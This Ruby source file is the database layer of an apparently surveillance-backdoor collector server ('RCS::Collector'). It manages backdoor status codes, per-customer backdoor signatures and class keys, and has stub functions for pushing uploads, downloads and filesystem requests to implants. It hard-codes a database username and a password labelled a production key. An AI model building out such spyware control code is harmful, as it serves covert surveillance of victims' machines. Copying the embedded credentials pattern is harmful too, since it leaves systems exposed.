#
#  The DB abstraction layer
#

# relatives
require_relative 'config.rb'
require_relative 'db_xmlrpc.rb'

# from RCS::Common
require 'rcs-common/trace'

# system
require 'digest/md5'
require 'singleton'
require 'pp'

module RCS
module Collector

class DB
  include Singleton
  include RCS::Tracer

  ACTIVE_BACKDOOR = 0
  DELETED_BACKDOOR = 1
  CLOSED_BACKDOOR = 2
  NO_SUCH_BACKDOOR = 3
  
  attr_reader :backdoor_signature

  def initialize
    # database address
    @host = Config.instance.global['DB_ADDRESS'].to_s + ":" + Config.instance.global['DB_PORT'].to_s

    # database credentials
    @username = "9b7b0492433bd580805ba7685ae41b73RSS" #TODO: use an unique id
    @password = "hJ44ApRjUrMgd5137WzVCXrkkCBYEG4o"    #TODO: this is the rcs-prod key

    # status of the db connection
    @available = false

    # global (per customer) backdoor signature
    @backdoor_signature = nil
    @class_keys = {}
    
    # the current db layer to be used is the XML-RPC protocol
    # this will be replaced by DB_rabbitmq
    @db = DB_xmlrpc.new @host

    return @available
  end

  def connect!
    trace :info, "Checking the DB connection [#{@host}]..."
    if @db.login @username, @password then
      @available = true
      trace :info, "Connected to [#{@host}]"
    else
      @available = false
      trace :error, "Cannot login to DB"
    end
  end

  def disconnect!
    @db.logout
    @available = false
    trace :info, "Disconnected from [#{@host}]"
  end

  def connected?
    # is the database available ?
    return @available
  end

  def cache_init
    if @available then
      trace :info, "Initializing the DB cache..."
      #TODO: empty the cache and populate it again

      # get the global signature (per customer) for all the backdoors
      sig = @db.backdoor_signature
      @backdoor_signature = Digest::MD5.digest sig unless sig.nil? 
      trace :debug, "Backdoor signature: [#{sig}]"

      # get the classkey of every backdoor and store it in the cache
      @class_keys = @db.class_keys
    else
      #TODO: check if the cache already exists and has some entries
    end
  end

  def update_status(status, message)
    trace :debug, "update status: #{message}"
    component = "RCS::Collector"
    remoteip = '' # used only by NC

    #TODO: implement these metrics
    disk = 0
    cpu = 0
    pcpu = 0

    @db.update_status component, remoteip, status, message, disk, cpu, pcpu 
  end

  def class_key_of(build_id)
    return Digest::MD5.digest @class_keys[build_id] unless @class_keys[build_id].nil?
  end

  def status_of(build_id, instance_id, subtype)
    #TODO: real query
    return ACTIVE_BACKDOOR, 0
  end

  def sync_for(bid, version, user, device, source, time)
    #TODO: implement
  end

  def new_conf?(bid)
    #TODO: implement
    return false
  end
  def new_conf(bid)
    #TODO: implement
    return nil
  end

  def new_uploads?(bid)
    #TODO: implement
    return true
  end
  def new_uploads(bid)
    #TODO: implement
    return {:filename => "c:\\cicciopasticcio", :content => "bubbaloa"}, 0
  end

  def new_downloads?(bid)
    #TODO: implement
    return true
  end
  def new_downloads(bid)
    #TODO: implement
    return ['c:\alor', 'c:\windows']
  end

  def new_filesystems?(bid)
    #TODO: implement
    return true
  end
  def new_filesystems(bid)
    #TODO: implement
    return [{:depth => 1, :path => 'c:\ciao'}, {:depth => 2, :path => 'd:\miao'}]
  end

end #DB

end #Collector::
end #RCS::